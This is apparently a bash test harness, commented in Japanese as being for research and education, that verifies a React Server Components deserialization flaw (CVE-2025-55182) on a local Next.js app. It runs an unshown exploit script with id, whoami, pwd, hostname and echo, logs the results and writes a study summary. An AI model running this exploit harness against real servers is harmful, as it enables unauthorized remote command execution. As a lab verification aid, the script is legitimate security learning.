#!/bin/bash
# RSC脆弱性検証テスト実行スクリプト
# 研究・教育目的のみ

set -e

# カラー出力設定
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# ログディレクトリ
LOG_DIR="proof"
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")

echo -e "${YELLOW}=== RSC脆弱性検証テスト ===${NC}"
echo "実行日時: $(date)"
echo "環境: $(uname -a)"
echo "Node.js: $(node -v)"
echo ""

# Next.jsアプリケーションの起動確認
echo -e "${YELLOW}[1/6] アプリケーション起動確認${NC}"
if curl -s http://localhost:3000 > /dev/null 2>&1; then
    echo -e "${GREEN}✓ Next.jsアプリケーションが起動しています${NC}"
else
    echo -e "${RED}✗ Next.jsアプリケーションが起動していません${NC}"
    echo "以下のコマンドでアプリケーションを起動してください："
    echo "  pnpm dev"
    exit 1
fi

echo ""

# テストケース1: id
echo -e "${YELLOW}[2/6] テストケース1: idコマンド実行${NC}"
if node doc/exploit-sample.js id > "${LOG_DIR}/test1_id_${TIMESTAMP}.txt" 2>&1; then
    echo -e "${GREEN}✓ テスト1成功${NC}"
    cat "${LOG_DIR}/test1_id_${TIMESTAMP}.txt"
else
    echo -e "${RED}✗ テスト1失敗${NC}"
fi

echo ""

# テストケース2: whoami
echo -e "${YELLOW}[3/6] テストケース2: whoamiコマンド実行${NC}"
if node doc/exploit-sample.js whoami > "${LOG_DIR}/test2_whoami_${TIMESTAMP}.txt" 2>&1; then
    echo -e "${GREEN}✓ テスト2成功${NC}"
    cat "${LOG_DIR}/test2_whoami_${TIMESTAMP}.txt"
else
    echo -e "${RED}✗ テスト2失敗${NC}"
fi

echo ""

# テストケース3: pwd
echo -e "${YELLOW}[4/6] テストケース3: pwdコマンド実行${NC}"
if node doc/exploit-sample.js pwd > "${LOG_DIR}/test3_pwd_${TIMESTAMP}.txt" 2>&1; then
    echo -e "${GREEN}✓ テスト3成功${NC}"
    cat "${LOG_DIR}/test3_pwd_${TIMESTAMP}.txt"
else
    echo -e "${RED}✗ テスト3失敗${NC}"
fi

echo ""

# テストケース4: hostname
echo -e "${YELLOW}[5/6] テストケース4: hostnameコマンド実行${NC}"
if node doc/exploit-sample.js hostname > "${LOG_DIR}/test4_hostname_${TIMESTAMP}.txt" 2>&1; then
    echo -e "${GREEN}✓ テスト4成功${NC}"
    cat "${LOG_DIR}/test4_hostname_${TIMESTAMP}.txt"
else
    echo -e "${RED}✗ テスト4失敗${NC}"
fi

echo ""

# テストケース5: エコーテスト
echo -e "${YELLOW}[6/6] テストケース5: echoコマンド実行${NC}"
if node doc/exploit-sample.js "echo 'CVE-2025-55182 verification test'" > "${LOG_DIR}/test5_echo_${TIMESTAMP}.txt" 2>&1; then
    echo -e "${GREEN}✓ テスト5成功${NC}"
    cat "${LOG_DIR}/test5_echo_${TIMESTAMP}.txt"
else
    echo -e "${RED}✗ テスト5失敗${NC}"
fi

echo ""
echo -e "${GREEN}=== テスト完了 ===${NC}"
echo "ログファイルは以下に保存されました："
echo "  ${LOG_DIR}/test*_${TIMESTAMP}.txt"
echo ""
echo "サマリーレポートを作成中..."

# サマリーレポート作成
cat > "${LOG_DIR}/test_summary_${TIMESTAMP}.md" <<EOF
# テスト実行サマリー

**実行日時**: $(date)
**環境**: $(uname -s)
**Node.js**: $(node -v)
**タイムスタンプ**: ${TIMESTAMP}

## テスト結果

### テストケース1: id
\`\`\`
$(cat "${LOG_DIR}/test1_id_${TIMESTAMP}.txt")
\`\`\`

### テストケース2: whoami
\`\`\`
$(cat "${LOG_DIR}/test2_whoami_${TIMESTAMP}.txt")
\`\`\`

### テストケース3: pwd
\`\`\`
$(cat "${LOG_DIR}/test3_pwd_${TIMESTAMP}.txt")
\`\`\`

### テストケース4: hostname
\`\`\`
$(cat "${LOG_DIR}/test4_hostname_${TIMESTAMP}.txt")
\`\`\`

### テストケース5: echo
\`\`\`
$(cat "${LOG_DIR}/test5_echo_${TIMESTAMP}.txt")
\`\`\`

## 学習ポイント

- デシリアライズ処理における入力検証の重要性を確認
- Server Actionsのセキュリティメカニズムを理解
- 脆弱性が実際に再現可能であることを学習

## 次のステップ

- パッチバージョン（react-server-dom-webpack 19.3.0+）での検証
- 緩和策の実装と効果確認
- チーム向けプレゼンテーション資料の作成
EOF

echo -e "${GREEN}サマリーレポート作成完了: ${LOG_DIR}/test_summary_${TIMESTAMP}.md${NC}"
